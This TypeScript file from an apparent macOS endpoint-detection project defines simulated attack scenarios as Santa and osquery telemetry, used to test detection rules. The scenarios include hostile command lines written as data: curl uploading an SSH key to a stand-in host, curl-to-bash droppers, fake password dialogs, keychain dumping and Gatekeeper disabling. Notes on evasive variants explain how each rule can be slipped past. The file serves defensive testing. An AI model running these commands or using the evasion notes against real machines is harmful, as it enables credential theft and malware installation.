import type { ProcessRef, SensorEvent } from '@vigil/core';

/**
 * Simulated attacks. Each scenario is the telemetry a real macOS threat
 * produces (Santa and osquery events), written as data: nothing here runs
 * malware or touches a real Mac. Scenarios mimic what public reports describe
 * for the named family.
 *
 * - `canonical`: the technique as the rule pack expects to see it. Every one
 *   of these must be caught; a miss is a regression.
 * - `evasive`: a small change real samples use (a different shell path, a
 *   signed stealer, a JavaScript dialog...). These measure the gaps; misses
 *   are findings, not failures.
 */

export type Variant = 'canonical' | 'evasive';

export interface AttackScenario {
  id: string;
  name: string;
  /** The real family or technique this stands in for. */
  mimics: string;
  tactic: Tactic;
  variant: Variant;
  /** Rules that should fire. For an evasive scenario, the rule meant to cover the technique. */
  expect: string[];
  /** Threat-list entries the scenario needs (the abuse.ch feeds or the user's own blocks). */
  lists?: Array<{ list: string; value: string }>;
  /** Only meaningful after the first-week learning period ("first seen" rules). */
  afterLearning?: boolean;
  /** Why an evasive variant is likely to slip past. */
  note?: string;
  events: (at: number) => SensorEvent[];
}

export type Tactic =
  | 'credential-access'
  | 'execution'
  | 'defense-evasion'
  | 'persistence'
  | 'command-and-control'
  | 'collection';

export const HOME = '/Users/sam';
const CHROME = `${HOME}/Library/Application Support/Google/Chrome/Default`;
const TERMINAL = '/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal';

let seq = 0;
function id(prefix: string): string {
  seq++;
  return `${prefix}-${seq}`;
}

function p(path: string, over: Partial<ProcessRef> = {}): ProcessRef {
  const name = path.split('/').pop() ?? path;
  return { pid: 40_000 + (seq % 20_000), ppid: 700, path, args: [name], uid: 501, ...over };
}

const stealer = (path = '/private/tmp/.installer/Installer', over: Partial<ProcessRef> = {}) =>
  p(path, {
    signing: 'adhoc',
    sha256: 'a1'.repeat(32),
    parentPath: '/bin/zsh',
    ...over,
  });

const appleTool = (
  path: string,
  args: string[],
  parentPath: string,
  over: Partial<ProcessRef> = {},
) => p(path, { args, signing: 'apple', parentPath, ppid: 812, ...over });

function exec(at: number, process: ProcessRef): SensorEvent {
  return { id: id('atk'), ts: at, source: 'santa', kind: 'process.exec', process };
}

function file(
  at: number,
  op: 'open' | 'write' | 'rename' | 'create',
  path: string,
  process: ProcessRef,
): SensorEvent {
  return { id: id('atk'), ts: at, source: 'santa', kind: 'file', op, path, process };
}

function connect(
  at: number,
  remoteAddress: string,
  process: ProcessRef,
  remoteHost?: string,
): SensorEvent {
  return {
    id: id('atk'),
    ts: at,
    source: 'osquery',
    kind: 'network.connection',
    direction: 'outbound',
    protocol: 'tcp',
    remoteAddress,
    remotePort: 443,
    process,
    ...(remoteHost ? { remoteHost } : {}),
  };
}

function launchAgent(
  at: number,
  path: string,
  program: string,
  programArgs: string[] = [program],
): SensorEvent {
  return {
    id: id('atk'),
    ts: at,
    source: 'osquery',
    kind: 'persistence',
    change: 'added',
    mechanism: 'launch_agent',
    path,
    label:
      path
        .split('/')
        .pop()
        ?.replace(/\.plist$/, '') ?? 'x',
    program,
    programArgs,
  };
}

const sh = (cmd: string, shell = 'zsh') => appleTool(`/bin/${shell}`, [shell, '-c', cmd], TERMINAL);

/** 64 hex chars that look like a sample hash, stable per name. */
export function fakeHash(name: string): string {
  let h = 0x811c9dc5;
  let out = '';
  for (let round = 0; out.length < 64; round++) {
    for (const c of `${name}:${round}`) h = Math.imul(h ^ c.charCodeAt(0), 0x01000193) >>> 0;
    out += h.toString(16).padStart(8, '0');
  }
  return out.slice(0, 64);
}

// Addresses from the documentation ranges, standing in for feed entries.
export const C2_IP = '203.0.113.66';
export const BAD_DOMAIN = 'cdn-update-check.example';
export const BAD_DOMAIN_IP = '198.51.100.23';

export const ATTACKS: AttackScenario[] = [
  // ------------------------------------------------------------ credential access
  {
    id: 'amos-password-dialog',
    name: 'Fake password dialog from osascript',
    mimics: 'Atomic Stealer (AMOS), Cuckoo, Banshee',
    tactic: 'credential-access',
    variant: 'canonical',
    expect: ['fake-password-prompt'],
    events: (at) => [
      exec(
        at,
        appleTool(
          '/usr/bin/osascript',
          [
            'osascript',
            '-e',
            'display dialog "macOS needs to access System Settings. Please enter your password." default answer "" with icon caution buttons {"Continue"} default button "Continue" with hidden answer',
          ],
          '/private/tmp/.installer/Installer',
        ),
      ),
    ],
  },
  {
    id: 'amos-chrome-logins',
    name: 'Unsigned program reads Chrome saved passwords',
    mimics: 'Atomic Stealer (AMOS)',
    tactic: 'credential-access',
    variant: 'canonical',
    expect: ['credential-theft-untrusted'],
    events: (at) => [file(at, 'open', `${CHROME}/Login Data`, stealer())],
  },
  {
    id: 'sqlite-chrome-cookies',
    name: 'sqlite3 dumps Chrome cookies',
    mimics: 'Poseidon / Rhadamanthys script stealers',
    tactic: 'credential-access',
    variant: 'canonical',
    expect: ['credential-theft-untrusted'],
    events: (at) => [
      file(
        at,
        'open',
        `${CHROME}/Cookies`,
        appleTool('/usr/bin/sqlite3', ['sqlite3', `${CHROME}/Cookies`], '/bin/bash'),
      ),
    ],
  },
  {
    id: 'python-firefox-logins',
    name: 'python3 reads Firefox logins',
    mimics: 'Python infostealers (e.g. MacStealer)',
    tactic: 'credential-access',
    variant: 'canonical',
    expect: ['credential-theft-untrusted'],
    events: (at) => [
      file(
        at,
        'open',
        `${HOME}/Library/Application Support/Firefox/Profiles/x1y2z3.default-release/logins.json`,
        appleTool('/usr/bin/python3', ['python3', '/private/tmp/s.py'], '/bin/zsh'),
      ),
    ],
  },
  {
    id: 'keychain-file-copy',
    name: 'Unsigned program opens login keychain file',
    mimics: 'AMOS, Cthulhu Stealer',
    tactic: 'credential-access',
    variant: 'canonical',
    expect: ['credential-theft-untrusted'],
    events: (at) => [file(at, 'open', `${HOME}/Library/Keychains/login.keychain-db`, stealer())],
  },
  {
    id: 'ssh-key-exfil',
    name: 'curl uploads an SSH private key',
    mimics: 'Supply-chain postinstall stealers',
    tactic: 'credential-access',
    variant: 'canonical',
    expect: ['credential-theft-untrusted'],
    events: (at) => [
      file(
        at,
        'open',
        `${HOME}/.ssh/id_ed25519`,
        appleTool(
          '/usr/bin/curl',
          ['curl', '-s', '-F', `k=@${HOME}/.ssh/id_ed25519`, 'https://paste.example/u'],
          '/bin/sh',
        ),
      ),
    ],
  },
  {
    id: 'wallet-exodus',
    name: 'Unsigned program reads the Exodus wallet',
    mimics: 'AMOS wallet module',
    tactic: 'credential-access',
    variant: 'canonical',
    expect: ['credential-theft-untrusted'],
    events: (at) => [
      file(
        at,
        'open',
        `${HOME}/Library/Application Support/Exodus/exodus.wallet/seed.seco`,
        stealer(),
      ),
    ],
  },
  {
    id: 'keychain-dump',
    name: 'security dump-keychain',
    mimics: 'Red-team keychain dumping',
    tactic: 'credential-access',
    variant: 'canonical',
    expect: ['keychain-dump'],
    events: (at) => [
      exec(
        at,
        appleTool(
          '/usr/bin/security',
          ['security', 'dump-keychain', '-d', 'login.keychain'],
          '/bin/zsh',
        ),
      ),
    ],
  },
  {
    id: 'jxa-password-dialog',
    name: 'Password dialog through JavaScript for Automation',
    mimics: 'AMOS variants using osascript -l JavaScript',
    tactic: 'credential-access',
    variant: 'evasive',
    expect: ['fake-password-prompt'],
    note: 'The rule looks for the AppleScript words "display dialog" and "hidden answer"; JXA spells them displayDialog and hiddenAnswer.',
    events: (at) => [
      exec(
        at,
        appleTool(
          '/usr/bin/osascript',
          [
            'osascript',
            '-l',
            'JavaScript',
            '-e',
            "var a=Application.currentApplication();a.includeStandardAdditions=true;a.displayDialog('Enter your password',{defaultAnswer:'',hiddenAnswer:true})",
          ],
          '/private/tmp/.installer/Installer',
        ),
      ),
    ],
  },
  {
    id: 'script-file-password-dialog',
    name: 'Password dialog from a compiled script file',
    mimics: 'AMOS variants shipping a .scpt',
    tactic: 'credential-access',
    variant: 'evasive',
    expect: ['fake-password-prompt'],
    note: 'The dialog text is inside the script file, so the command line has nothing to match.',
    events: (at) => [
      exec(
        at,
        appleTool(
          '/usr/bin/osascript',
          ['osascript', '/private/tmp/.installer/p.scpt'],
          '/private/tmp/.installer/Installer',
        ),
      ),
    ],
  },
  {
    id: 'chrome-safe-storage-key',
    name: 'security find-generic-password for Chrome Safe Storage',
    mimics: 'AMOS, Cuckoo (decrypts Chrome passwords)',
    tactic: 'credential-access',
    variant: 'evasive',
    expect: ['keychain-dump'],
    note: 'Only dump-keychain is covered; stealers ask for the one Chrome key with find-generic-password.',
    events: (at) => [
      exec(
        at,
        appleTool(
          '/usr/bin/security',
          ['security', 'find-generic-password', '-wa', 'Chrome'],
          '/private/tmp/.installer/Installer',
        ),
      ),
    ],
  },
  {
    id: 'signed-stealer-logins',
    name: 'Developer-ID signed stealer reads Chrome passwords',
    mimics: 'AMOS and Cuckoo samples signed with stolen or throwaway Developer IDs',
    tactic: 'credential-access',
    variant: 'evasive',
    expect: ['credential-theft-untrusted', 'santa-protected-file-access'],
    note: 'credential-theft-untrusted trusts any valid Developer ID; the Santa protected-file rule still alerts.',
    events: (at) => [
      file(
        at,
        'open',
        `${CHROME}/Login Data`,
        stealer('/Applications/PDF Converter.app/Contents/MacOS/PDF Converter', {
          signing: 'developer_id',
          teamId: 'Q7ZX5V6RFK',
        }),
      ),
    ],
  },
  {
    id: 'cp-login-data',
    name: 'cp copies Chrome Login Data to a staging folder',
    mimics: 'Shell-script stealers (ditto / cp staging)',
    tactic: 'credential-access',
    variant: 'evasive',
    expect: ['credential-theft-untrusted'],
    note: 'cp and ditto are Apple-signed and not in the script-tool list.',
    events: (at) => [
      file(
        at,
        'open',
        `${CHROME}/Login Data`,
        appleTool('/bin/cp', ['cp', `${CHROME}/Login Data`, '/private/tmp/.s/ld'], '/bin/bash'),
      ),
    ],
  },

  // ------------------------------------------------------------------ execution
  {
    id: 'clickfix-curl-pipe',
    name: '"Paste this in Terminal" curl | bash',
    mimics: 'ClickFix / fake CAPTCHA campaigns, AMOS droppers',
    tactic: 'execution',
    variant: 'canonical',
    expect: ['download-pipe-to-shell'],
    events: (at) => [exec(at, sh('curl -fsSL https://get-update.example/i.sh | bash'))],
  },
  {
    id: 'clickfix-subshell',
    name: 'bash -c "$(curl ...)"',
    mimics: 'ClickFix variants',
    tactic: 'execution',
    variant: 'canonical',
    expect: ['download-pipe-to-shell'],
    events: (at) => [
      exec(at, sh('/bin/bash -c "$(curl -fsSL https://get-update.example/i.sh)"', 'bash')),
    ],
  },
  {
    id: 'base64-to-shell',
    name: 'base64 -d | sh',
    mimics: 'AMOS and Cuckoo first stages',
    tactic: 'execution',
    variant: 'canonical',
    expect: ['base64-pipe-to-shell'],
    events: (at) => [
      exec(at, sh('echo Y3VybCAtcyBodHRwczovL3guZXhhbXBsZSB8IHNo | base64 -d | sh')),
    ],
  },
  {
    id: 'unsigned-download-opened',
    name: 'Unsigned app from the web opened',
    mimics: 'Cracked-app droppers',
    tactic: 'execution',
    variant: 'canonical',
    expect: ['unsigned-quarantined-exec'],
    events: (at) => [
      exec(
        at,
        p(`${HOME}/Downloads/Photoshop Crack.app/Contents/MacOS/Installer`, {
          signing: 'adhoc',
          sha256: fakeHash('crack'),
          parentPath: '/sbin/launchd',
          ppid: 1,
          quarantine: { originUrl: 'https://mega.example/file/abc', agent: 'Safari' },
        }),
      ),
    ],
  },
  {
    id: 'shared-temp-exec',
    name: 'New unsigned program in /Users/Shared',
    mimics: 'Second stages dropped in shared folders',
    tactic: 'execution',
    variant: 'canonical',
    expect: ['exec-from-shared-temp'],
    afterLearning: true,
    events: (at) => [
      exec(at, p('/Users/Shared/.update/agent', { signing: 'unsigned', parentPath: '/bin/bash' })),
    ],
  },
  {
    id: 'known-bad-hash',
    name: 'Known malware hash runs',
    mimics: 'Any sample on MalwareBazaar',
    tactic: 'execution',
    variant: 'canonical',
    expect: ['known-bad-hash'],
    lists: [{ list: 'known_bad_sha256', value: fakeHash('known-bad') }],
    events: (at) => [
      exec(at, stealer(`${HOME}/Downloads/Setup`, { sha256: fakeHash('known-bad') })),
    ],
  },
  {
    id: 'user-blocked-returns',
    name: 'Program the user blocked comes back',
    mimics: 'Re-infection after cleanup',
    tactic: 'execution',
    variant: 'canonical',
    expect: ['user-blocked-hash'],
    lists: [{ list: 'user_blocked_sha256', value: fakeHash('user-blocked') }],
    events: (at) => [
      exec(at, stealer('/private/tmp/.x/relaunch', { sha256: fakeHash('user-blocked') })),
    ],
  },
  {
    id: 'curl-pipe-full-path',
    name: 'curl | /bin/bash (full path)',
    mimics: 'ClickFix variants',
    tactic: 'execution',
    variant: 'evasive',
    expect: ['download-pipe-to-shell'],
    note: 'The pattern expects the shell name right after the pipe, not a full path.',
    events: (at) => [exec(at, sh('curl -fsSL https://get-update.example/i.sh | /bin/bash'))],
  },
  {
    id: 'curl-pipe-python',
    name: 'curl | python3',
    mimics: 'Python droppers',
    tactic: 'execution',
    variant: 'evasive',
    expect: ['download-pipe-to-shell'],
    note: 'Only sh, bash, zsh and dash count as shells.',
    events: (at) => [exec(at, sh('curl -s https://get-update.example/a.py | python3'))],
  },
  {
    id: 'curl-then-run',
    name: 'Download to a file, then run it',
    mimics: 'Two-step droppers',
    tactic: 'execution',
    variant: 'evasive',
    expect: ['download-pipe-to-shell'],
    note: 'Nothing is piped, so the one-line pattern never sees it.',
    events: (at) => [
      exec(
        at,
        sh('curl -so /private/tmp/u.sh https://get-update.example/u.sh && sh /private/tmp/u.sh'),
      ),
    ],
  },
  {
    id: 'process-substitution',
    name: 'bash <(curl ...)',
    mimics: 'Installer-style one-liners',
    tactic: 'execution',
    variant: 'evasive',
    expect: ['download-pipe-to-shell'],
    note: 'Process substitution uses <( ), not a pipe or $( ).',
    events: (at) => [exec(at, sh('bash <(curl -fsSL https://get-update.example/i.sh)', 'bash'))],
  },
  {
    id: 'curl-dropped-hidden-folder',
    name: 'curl-downloaded payload runs from a hidden Application Support folder',
    mimics: 'AMOS and RustBucket second stages',
    tactic: 'execution',
    variant: 'evasive',
    expect: ['unsigned-quarantined-exec', 'exec-from-shared-temp'],
    afterLearning: true,
    note: 'curl does not set the quarantine flag and the folder is not /tmp or /Users/Shared.',
    events: (at) => [
      exec(
        at,
        p(`${HOME}/Library/Application Support/.com.apple.sysd/sysd`, {
          signing: 'unsigned',
          parentPath: '/bin/bash',
        }),
      ),
    ],
  },

  // ------------------------------------------------------------- defense evasion
  {
    id: 'xattr-remove-quarantine',
    name: 'xattr -d com.apple.quarantine',
    mimics: 'Cracked apps telling users to clear the flag',
    tactic: 'defense-evasion',
    variant: 'canonical',
    expect: ['quarantine-removed'],
    events: (at) => [
      exec(
        at,
        appleTool(
          '/usr/bin/xattr',
          ['xattr', '-d', 'com.apple.quarantine', '/Applications/Sketch Cracked.app'],
          '/bin/zsh',
        ),
      ),
    ],
  },
  {
    id: 'xattr-clear-all',
    name: 'xattr -cr on a download',
    mimics: 'Same, recursive',
    tactic: 'defense-evasion',
    variant: 'canonical',
    expect: ['quarantine-removed'],
    events: (at) => [
      exec(
        at,
        appleTool('/usr/bin/xattr', ['xattr', '-cr', `${HOME}/Downloads/Tool.app`], '/bin/zsh'),
      ),
    ],
  },
  {
    id: 'gatekeeper-off',
    name: 'spctl --master-disable',
    mimics: 'Adware installers turning off Gatekeeper',
    tactic: 'defense-evasion',
    variant: 'canonical',
    expect: ['gatekeeper-disabled'],
    events: (at) => [
      exec(at, appleTool('/usr/sbin/spctl', ['spctl', '--master-disable'], '/usr/bin/sudo')),
    ],
  },
  {
    id: 'tcc-db-write',
    name: 'Unsigned program writes the privacy (TCC) database',
    mimics: 'TCC bypasses (e.g. XCSSET)',
    tactic: 'defense-evasion',
    variant: 'canonical',
    expect: ['tcc-database-tamper'],
    events: (at) => [
      file(
        at,
        'write',
        `${HOME}/Library/Application Support/com.apple.TCC/TCC.db`,
        stealer('/private/tmp/.x/tccutil2'),
      ),
    ],
  },
  {
    id: 'santa-blocked',
    name: 'Santa blocks a launch',
    mimics: 'Anything on a Vigil block rule',
    tactic: 'defense-evasion',
    variant: 'canonical',
    expect: ['santa-blocked-launch'],
    events: (at) => [
      {
        id: id('atk'),
        ts: at,
        source: 'santa',
        kind: 'santa.decision',
        target: 'execution',
        decision: 'block',
        reason: 'BLOCK_BINARY',
        process: stealer('/private/tmp/.x/relaunch'),
      },
    ],
  },
  {
    id: 'xprotect-hit',
    name: 'XProtect detects malware',
    mimics: "macOS's own malware signatures firing",
    tactic: 'defense-evasion',
    variant: 'evasive',
    expect: ['xprotect-detected'],
    events: (at) => [
      {
        id: id('atk'),
        ts: at,
        source: 'santa',
        kind: 'system.alert',
        subtype: 'xprotect_detected',
        path: `${HOME}/Downloads/Setup.app`,
        details: { malware: 'MACOS.ADLOAD.AGE' },
      },
    ],
  },

  // ----------------------------------------------------------------- persistence
  {
    id: 'launch-agent-temp',
    name: 'Launch agent that runs a program in /Users/Shared',
    mimics: 'Adload, Shlayer persistence',
    tactic: 'persistence',
    variant: 'canonical',
    expect: ['persistence-suspicious-program'],
    events: (at) => [
      launchAgent(
        at,
        `${HOME}/Library/LaunchAgents/com.update.agent.plist`,
        '/Users/Shared/.update/agent',
      ),
    ],
  },
  {
    id: 'launch-agent-curl',
    name: 'Launch agent that runs curl | sh at login',
    mimics: 'Fileless persistence',
    tactic: 'persistence',
    variant: 'canonical',
    expect: ['persistence-suspicious-program'],
    events: (at) => [
      launchAgent(at, `${HOME}/Library/LaunchAgents/com.sync.helper.plist`, '/bin/bash', [
        '/bin/bash',
        '-c',
        'curl -s https://get-update.example/b | sh',
      ]),
    ],
  },
  {
    id: 'launch-agent-apple-name',
    name: 'Launch agent named like Apple',
    mimics: 'Masquerading persistence (e.g. com.apple.softwareupdated)',
    tactic: 'persistence',
    variant: 'canonical',
    expect: ['persistence-apple-lookalike'],
    events: (at) => [
      launchAgent(
        at,
        `${HOME}/Library/LaunchAgents/com.apple.softwareupdated.plist`,
        `${HOME}/Library/Application Support/.softwareupdated/sud`,
      ),
    ],
  },
  {
    id: 'launch-agent-app-support',
    name: 'Launch agent for a hidden program in Application Support',
    mimics: 'AMOS 2025 backdoor, RustBucket',
    tactic: 'persistence',
    variant: 'evasive',
    expect: ['persistence-suspicious-program'],
    afterLearning: true,
    note: 'Only the low-severity "new login item" rule fires, and it raises no popup.',
    events: (at) => [
      launchAgent(
        at,
        `${HOME}/Library/LaunchAgents/com.helper.update.plist`,
        `${HOME}/Library/Application Support/.helper/update`,
      ),
    ],
  },
  {
    id: 'browser-extension-all-sites',
    name: 'Extension with access to every site and cookies',
    mimics: 'Malicious Chrome extensions (Cyberhaven-style hijack)',
    tactic: 'persistence',
    variant: 'canonical',
    expect: ['browser-extension-broad-access'],
    afterLearning: true,
    events: (at) => [
      {
        id: id('atk'),
        ts: at,
        source: 'osquery',
        kind: 'browser.extension',
        change: 'added',
        browser: 'chrome',
        extensionId: 'kgdlbgeabnhacbmclpgpepfdmkdpdoen',
        name: 'PDF Helper Pro',
        permissions: ['<all_urls>', 'cookies', 'webRequest', 'storage'],
      },
    ],
  },

  // --------------------------------------------------------- command and control
  {
    id: 'c2-known-ip',
    name: 'Connection to a botnet command server',
    mimics: 'Feodo Tracker C2 address',
    tactic: 'command-and-control',
    variant: 'canonical',
    expect: ['known-bad-destination'],
    lists: [{ list: 'known_bad_ips', value: C2_IP }],
    events: (at) => [connect(at, C2_IP, stealer())],
  },
  {
    id: 'malware-site-by-name',
    name: 'Connection to a malware site (host name known)',
    mimics: 'URLhaus host',
    tactic: 'command-and-control',
    variant: 'canonical',
    expect: ['known-bad-domain'],
    lists: [{ list: 'known_bad_domains', value: BAD_DOMAIN }],
    events: (at) => [
      connect(
        at,
        BAD_DOMAIN_IP,
        p('/usr/bin/curl', { signing: 'apple', parentPath: '/bin/zsh', ppid: 900 }),
        BAD_DOMAIN,
      ),
    ],
  },
  {
    id: 'malware-site-osquery',
    name: 'Connection to a malware site as osquery reports it',
    mimics: 'URLhaus host',
    tactic: 'command-and-control',
    variant: 'evasive',
    expect: ['known-bad-domain'],
    lists: [{ list: 'known_bad_domains', value: BAD_DOMAIN }],
    note: "osquery's socket table has no host names, so the domain list never matches real connection events.",
    events: (at) => [
      connect(
        at,
        BAD_DOMAIN_IP,
        p('/usr/bin/curl', { signing: 'apple', parentPath: '/bin/zsh', ppid: 900 }),
      ),
    ],
  },
  {
    id: 'backdoor-listener',
    name: 'Unsigned program listens on all interfaces',
    mimics: 'Bind-shell backdoors',
    tactic: 'command-and-control',
    variant: 'canonical',
    expect: ['new-network-listener'],
    afterLearning: true,
    events: (at) => [
      {
        id: id('atk'),
        ts: at,
        source: 'osquery',
        kind: 'network.listen',
        protocol: 'tcp',
        localAddress: '0.0.0.0',
        localPort: 4444,
        process: stealer('/private/tmp/.x/bind'),
      },
    ],
  },

  // ------------------------------------------------------------------ collection
  {
    id: 'document-sweep',
    name: 'Unsigned program opens 60 documents in 30 seconds',
    mimics: 'AMOS FileGrabber module',
    tactic: 'collection',
    variant: 'canonical',
    expect: ['mass-document-reads'],
    events: (at) => {
      const s = stealer();
      return Array.from({ length: 60 }, (_, i) =>
        file(at + i * 500, 'open', `${HOME}/Documents/file-${i}.pdf`, s),
      );
    },
  },
  {
    id: 'document-sweep-python',
    name: 'python3 opens 60 documents in 30 seconds',
    mimics: 'Script-based FileGrabber',
    tactic: 'collection',
    variant: 'evasive',
    expect: ['mass-document-reads'],
    note: 'The rule only counts untrusted programs; python3 is Apple-signed.',
    events: (at) => {
      const s = appleTool('/usr/bin/python3', ['python3', '/private/tmp/g.py'], '/bin/zsh');
      return Array.from({ length: 60 }, (_, i) =>
        file(at + i * 500, 'open', `${HOME}/Documents/file-${i}.pdf`, s),
      );
    },
  },
];
